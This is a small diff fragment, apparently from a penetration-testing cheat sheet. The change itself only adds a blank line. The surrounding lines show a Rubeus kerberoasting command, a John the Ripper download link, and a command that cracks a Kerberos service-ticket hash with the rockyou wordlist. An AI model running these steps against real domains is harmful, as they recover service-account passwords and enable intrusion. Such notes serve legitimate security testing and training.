@@ -65,6 +65,7 @@ Rubeus.exe kerberoast /simple
 
 # Ticket Crack
 https://www.openwall.com/john/k/john-1.9.0-jumbo-1-win64.zip
+
 **Using John**:
 ```cmd
 john-1.9.0-jumbo-1-win64\run\john.exe -- wordlist=rockyou.txt spn_hash.txt
